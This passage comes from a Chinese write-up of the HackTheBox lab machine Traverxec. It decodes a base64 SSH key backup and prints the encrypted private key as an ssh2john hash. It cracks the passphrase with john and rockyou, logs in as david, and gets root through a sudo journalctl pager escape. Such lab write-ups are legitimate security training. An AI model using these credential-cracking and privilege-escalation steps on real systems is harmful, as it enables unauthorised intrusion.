+&gt; Ttb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6
+&gt; ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCP
+&gt; qz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3
+&gt; xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9
+&gt; M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465
+&gt; QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaip
+&gt; FsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY
+&gt; 1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydK
+&gt; DosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn
+&gt; 0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx
+&gt; 5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP5
+&gt; 1jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBq
+&gt; mVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGF
+&gt; d+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBds
+&gt; Mp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronU
+&gt; pOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuII
+&gt; FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
+&gt; 6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+
+&gt; e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> sshbackup.tgz
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>解压 sshbackup.tgz，发现 david 的 ssh 密钥</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>root@kali:~# <span class="nb">tar</span> <span class="nt">-zxvf</span> sshbackup.tgz
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>使用 ssh2john 对 passphrase 进行爆破</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre>root@kali:~/home/david/.ssh# <span class="nb">ls
+</span>authorized_keys  id_rsa  id_rsa.pub
+root@kali:~/home/david/.ssh# ssh2john id_rsa <span class="o">&gt;</span> davidhash
+root@kali:~/home/david/.ssh# <span class="nb">ls
+</span>authorized_keys  davidhash  id_rsa  id_rsa.pub
+root@kali:~/home/david/.ssh# <span class="nb">cat </span>davidhash 
+id_rsa:<span class="nv">$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c34373745454646424135364639443238334433343930333344354430384334460a0a73657965482f6665473139546c55614d6476485a4b2f32716679387077776472397367373578346850704a4a3859617568576f72434e344c504a562b776643470a7475694250665a792b5a506b6c4c6b4f6e654967676f72754c6b564757346b343635317077656b5a6e6a735438494d4d336a6e644c4e53526b6a7843545833570a4b7a5739564650756a53515a6e484d394a686f364a384f384c547a6c2b7336476a507046786a6f324172326e50776a6f666451656a5042654f376b58774446550a524a5570637341747048416258614a49394c46795838496851386672544f4f4c75424d6d75534577687a394b566a77326b694c424c794b532b735554392f56370a48485648573437592f455646677245584b75304f503872467459554c512b376b376e666237664849674b4a2f3651595a65363972304158454f747634347a49630a59314f4d47727951703543567a746343484c79532f394773524230643054746c7159324c586b2b316e75595079795a4a68796e6745376250396a73702b6865630a645452715671546e50377a493847794b54562b4b4e6741306d375557514e532b4a67717653513959446a5a4977466c41386a784a503948737557575854305a4e0a36706d595a632f724e6b43456c326c2f6f4a62614a42336a502f3147577a6f2f71354a5841366a6a79726439785a444e356258324532677a646343506435714f0a78777a6e61366a73326b4d64437849524e5645726e7653474249425330732f4f6e5870486e4a546a4d726b716772505743654c41663078455054676b747169310a5132494d4a716857394c6b55733438732b7a37326541686c386e614566676e2b6662516d354d4d5a2f783642437578534e574146716e756a3452414c6a646e360a693237676573526b78786e534d5a35446d51584d7272494275754c4a366748676a72756143706468354875454845665546716e624a6f624a41334e65763534540a667a654174523872564a486c43756f356a6d75366869747147736a7948464a2f6853465974624f35436d5a5230684d576c317a56513343624e686a65497746410a627a67537a7a4a644b59624744397479664b337a3352636b566867564467454d465242354871432b7948447952622b55356b61334c636c675431724f2b32736f0a75446936665879764142582b653445346c774a5a6f4274486b2f4e714d76445465623974644e4f6b566254644663326b57747a3938564639796f4e38327538490a416b2f4b4f6e70376c7a486e523037647664443631527a486b6d3337727654597255657861484a343538644854333672665578616665383176366c36524d38730a3943427245702b4c4b4141324a724b35503230427271467550665758764674524f4c596570473965484e46654e34754d7375542f35356c62666e355334312f550a72477730747859496e566d654c5230524a4f333762332f68615349727963616b384c5a7a465350554e757771466362785238514a4671714c7868614d7a7475610a346d4f717241654746505038445367593354436c6f524d3048692f4d7a485055496374784856325262594f2f36544448667a2b5a32366e7458507a75416752550a2f38477a67773536457948446154674e7471596164587275594a31694e447941724541752b4b76565a68596c596a68534c46666f327952644f7547426d3941580a4a504e65617877304458385577476241517955306b3439655042466545675168394e4563596567436f486c7561717061667859783263354d7059316e5267382b0a58427a624c463970634d785a69415772733462575571416f645866455536465a7637647361745461396c77483034616a2f35717845624a757775417557354c680a684f52415a766248754978437a6e657171526a5334744e526d306b4639754935576b664b31654c4d4f336758745666664f36764444336d63544e4c31705175660a53503047717651316469426978504d782b596b69696d526767557763476e64336c52424251324d4e7757743539527269335a34416930706662314b3754764f4d0a6a3161513462516d56583875426f7162507657302f6f516a6b624376665234587636512b6362612f466e474e5a78684852386a6348383056614e5334363974740a5665596e6946552f54476e524b44594c51483278306e693174426630774b4f4c45525930436247446371757a526f576a416d544e2f5056325662454b4b442f770a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a</span><span class="k">*</span>1766<span class="k">*</span>0
+root@kali:~/home/david/.ssh# john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt davidhash
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>获得 ssh 登录密码 <code class="highlighter-rouge">hunter</code></p>
+
+<p>使用 ssh 登录获得 user 权限，读取 user.txt</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>root@kali:~# ssh <span class="nt">-i</span> ./home/david/.ssh/id_rsa david@traverxec.htb
+ssh: Could not resolve <span class="nb">hostname </span>traverxec.htb: Name or service not known
+root@kali:~# ssh <span class="nt">-i</span> ./home/david/.ssh/id_rsa david@10.10.10.165
+Enter passphrase <span class="k">for </span>key <span class="s1">'./home/david/.ssh/id_rsa'</span>: 
+Linux traverxec 4.19.0-6-amd64 <span class="c">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
+Last login: Thu Jan  2 10:55:21 2020 from 10.10.14.47
+david@traverxec:~<span class="nv">$ </span><span class="nb">ls
+</span>bin  public_www  user.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="0x04-roottxt">0x04 root.txt</h2>
+
+<p>当进行提权时，注意到的第一件事是 david 的主目录中有一个 bin 目录，该目录中有一个名为 server-stats.sh 的文件。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre>david@traverxec:/bin<span class="nv">$ </span><span class="nb">cd
+</span>david@traverxec:~<span class="nv">$ </span><span class="nb">cd </span>bin
+david@traverxec:~/bin<span class="nv">$ </span><span class="nb">ls
+</span>server-stats.head  server-stats.sh  try.sh
+david@traverxec:~/bin<span class="nv">$ </span>./server-stats.sh 
+                                                                          .----.
+                                                              .---------. | <span class="o">==</span> |
+   Webserver Statistics and Data                              |.-<span class="s2">"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::</span><span class="se">\"</span><span class="s2">    "</span>
+                                                            /:::<span class="o">=======</span>:::<span class="se">\</span>
+                                                        jgs <span class="s1">'"""""""""""""'</span> 
+
+Load:  11:15:23 up  1:00,  3 <span class="nb">users</span>,  load average: 0.11, 0.04, 0.01
+ 
+Open nhttpd sockets: 18
+Files <span class="k">in </span>the docroot: 117
+ 
+Last 5 journal log lines:
+<span class="nt">--</span> Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:15:23 EST. <span class="nt">--</span>
+Jan 02 11:14:48 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nb">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span>33 <span class="nv">euid</span><span class="o">=</span>0 <span class="nb">tty</span><span class="o">=</span>/dev/pts/12 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
+Jan 02 11:14:50 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: conversation failed
+Jan 02 11:14:50 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data]
+Jan 02 11:14:50 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: www-data : <span class="nb">command </span>not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/12 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/dev/shm <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
+Jan 02 11:14:51 traverxec crontab[2855]: <span class="o">(</span>www-data<span class="o">)</span> LIST <span class="o">(</span>www-data<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>journalctl 是一个收集服务日志的服务</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>david@traverxec:~/bin<span class="nv">$ </span><span class="nb">cat </span>server-stats.sh 
+<span class="c">#!/bin/bash</span>
+<span class="nb">cat</span> /home/david/bin/server-stats.head
+<span class="nb">echo</span> <span class="s2">"Load: </span><span class="sb">`</span>/usr/bin/uptime<span class="sb">`</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">" "</span>
+<span class="nb">echo</span> <span class="s2">"Open nhttpd sockets: </span><span class="sb">`</span>/usr/bin/ss <span class="nt">-H</span> sport <span class="o">=</span> 80 | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">"Files in the docroot: </span><span class="sb">`</span>/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">" "</span>
+<span class="nb">echo</span> <span class="s2">"Last 5 journal log lines:"</span>
+/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>发现  /usr/bin/journalctl 是作为 root 运行的，这一点很重要。</p>
+
+<p>查看  <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFObins</a>，发现通过 sudo 运行的 journalctl 可以被利用来提权。</p>
+
+<blockquote>
+  <p><strong>GTFObins:</strong> Gtfo这款工具采用Python3开发，在Gtfo的帮助下，广大研究人员可以直接在命令行终端窗口中搜索 GTFOBins(Linux) 和 LOLBAS(Win) 代码文件。</p>
+
+  <p>该工具的主要功能就是帮助研究人员直在命令行终端窗口中搜索 GTFOBins 和 LOLBAS 代码文件。除此之外，它还可以让研究人员专注于命令行串钩，而无需面对明亮的白色背景的桌面窗口，它可以帮助我们将vim、反向Shell和其他漏洞利用“合为一体”。</p>
+
+  <p><a href="https://www.freebuf.com/sectool/214286.html">如何在Windows和Linux上搜索可利用的二进制文件或exe文件</a></p>
+</blockquote>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5evah4wj31e00u07bg.jpg" alt="image-20200103100856286" /></p>
+
+<p>注意到 <code class="highlighter-rouge">journalctl</code> 的提权利用方式和 <code class="highlighter-rouge">less</code> 一样，因此必须想办法触发 <code class="highlighter-rouge">pager</code> ，一个简单的办法就是把终端窗口尽可能调小。之后执行 <code class="highlighter-rouge">!/bin/sh</code>，获得 root 权限。</p>
+
+<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5opf7nlj31c00u0b29.jpg" />    <br />    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">当窗口较大则无法触发</div> </center>
+<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj60bu62rj31460u0qdv.jpg" />    <br />    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">当窗口较小则可以提权</div> </center>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>david@traverxec:~/bin<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
+<span class="nt">--</span> Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:21:37 EST
+Jan 02 11:14:48 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: authentication failur
+Jan 02 11:14:50 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: conversation failed
+Jan 02 11:14:50 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: auth could not identi
+Jan 02 11:14:50 traverxec <span class="nb">sudo</span><span class="o">[</span>2762]: www-data : <span class="nb">command </span>not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/1
+Jan 02 11:14:51 traverxec crontab[2855]: <span class="o">(</span>www-data<span class="o">)</span> LIST <span class="o">(</span>www-data<span class="o">)</span>
+<span class="o">!</span>/bin/sh
+<span class="c"># ls</span>
+server-stats.head  server-stats.sh  try.sh
+<span class="c"># cd</span>
+<span class="c"># whoami</span>
+root
+<span class="c"># ls</span>
+nostromo_1.9.6-1.deb  root.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="0x05-thanks">0x05 Thanks！</h2>
+
+<p>也算是自己边学边记录，望大佬手下留情~</p>
+:ET
